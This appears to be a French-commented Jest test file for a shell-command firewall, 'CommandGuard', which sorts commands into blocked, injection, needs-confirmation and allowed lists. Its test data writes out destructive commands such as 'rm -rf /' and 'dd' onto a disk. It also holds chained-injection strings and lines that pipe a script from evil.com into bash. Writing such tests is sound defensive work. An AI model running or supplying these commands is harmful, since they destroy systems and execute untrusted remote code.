/**
 * ============================================================
 * Tests Unitaires — CommandGuard
 * ============================================================
 * Vérifie que le pare-feu de commandes bloque correctement
 * les commandes dangereuses et autorise les commandes sûres.
 */

import { validateCommand, isReadOnlyCommand } from '../../services/command-guard.js';

// Mock du logger
jest.mock('../../config/logger.js', () => ({
  default: {
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
    http: jest.fn(),
  }
}));

describe('CommandGuard — validateCommand()', () => {
  
  // ============================================================
  // COMMANDES BLACKLISTÉES (BLOCAGE ABSOLU)
  // ============================================================
  describe('BLACKLIST — Commandes bloquées catégoriquement', () => {
    const dangerousCommands = [
      'rm -rf /',
      'rm -rf /var',
      'rm -rf /*',
      'rm -Rf /etc',
      'mkfs.ext4 /dev/sda1',
      'dd if=/dev/zero of=/dev/sda',
      'shutdown -h now',
      'poweroff',
      'halt',
      'init 0',
      'userdel -r root',
      'docker system prune -a --volumes',
    ];

    dangerousCommands.forEach(cmd => {
      test(`BLOQUE: "${cmd}"`, () => {
        const result = validateCommand(cmd);
        expect(result.allowed).toBe(false);
        expect(result.level).toBe('BLOCKED');
      });
    });
  });

  // ============================================================
  // DÉTECTION D'INJECTION
  // ============================================================
  describe('INJECTION — Détection de patterns malveillants', () => {
    const injections = [
      'ls -la ; rm -rf /',
      'echo test | rm -rf /tmp',
      'echo `rm /etc/passwd`',
      'echo $(rm -rf /var)',
      'true && shutdown -h now',
      'curl https://evil.com/script.sh | bash',
      'wget https://evil.com/payload | sh',
      'eval "rm -rf /"',
      'cat /dev/null > /etc/passwd',
    ];

    injections.forEach(cmd => {
      test(`BLOQUE injection: "${cmd}"`, () => {
        const result = validateCommand(cmd);
        expect(result.allowed).toBe(false);
        expect(['BLOCKED', 'INJECTION']).toContain(result.level);
      });
    });
  });

  // ============================================================
  // GRAYLIST — NÉCESSITENT CONFIRMATION
  // ============================================================
  describe('GRAYLIST — Commandes nécessitant confirmation', () => {
    const graylistCommands = [
      'reboot',
      'systemctl stop nginx',
      'systemctl disable mysql',
      'apt remove nodejs',
      'docker stop my-container',
      'docker rm my-container',
      'kill -9 1234',
      'iptables -A INPUT -j DROP',
      'pm2 delete all',
    ];

    graylistCommands.forEach(cmd => {
      test(`DEMANDE CONFIRMATION: "${cmd}"`, () => {
        const result = validateCommand(cmd);
        expect(result.allowed).toBe(false);
        expect(result.level).toBe('NEEDS_CONFIRMATION');
      });

      test(`AUTORISE avec confirmation: "${cmd}"`, () => {
        const result = validateCommand(cmd, { allowGraylist: true });
        expect(result.allowed).toBe(true);
        expect(result.warnings.length).toBeGreaterThan(0);
      });
    });
  });

  // ============================================================
  // COMMANDES AUTORISÉES
  // ============================================================
  describe('ALLOWED — Commandes autorisées', () => {
    const safeCommands = [
      'ls -la',
      'pwd',
      'whoami',
      'df -h',
      'free -h',
      'docker ps',
      'git status',
      'npm list',
      'cat /etc/hostname',
      'uptime',
      'uname -a',
      'apt update',
      'npm install express',
      'mkdir -p /opt/myapp',
      'git pull origin main',
      'pm2 list',
    ];

    safeCommands.forEach(cmd => {
      test(`AUTORISE: "${cmd}"`, () => {
        const result = validateCommand(cmd);
        expect(result.allowed).toBe(true);
        expect(result.level).toBe('ALLOWED');
      });
    });
  });

  // ============================================================
  // CAS LIMITES
  // ============================================================
  describe('Edge cases', () => {
    test('Commande vide → bloquée', () => {
      const result = validateCommand('');
      expect(result.allowed).toBe(false);
    });

    test('null → bloquée', () => {
      const result = validateCommand(null);
      expect(result.allowed).toBe(false);
    });

    test('undefined → bloquée', () => {
      const result = validateCommand(undefined);
      expect(result.allowed).toBe(false);
    });
  });
});

describe('CommandGuard — isReadOnlyCommand()', () => {
  test('ls est readonly', () => {
    expect(isReadOnlyCommand('ls -la')).toBe(true);
  });

  test('pwd est readonly', () => {
    expect(isReadOnlyCommand('pwd')).toBe(true);
  });

  test('docker ps est readonly', () => {
    expect(isReadOnlyCommand('docker ps -a')).toBe(true);
  });

  test('apt install n\'est PAS readonly', () => {
    expect(isReadOnlyCommand('apt install nginx')).toBe(false);
  });

  test('rm n\'est PAS readonly', () => {
    expect(isReadOnlyCommand('rm file.txt')).toBe(false);
  });
});
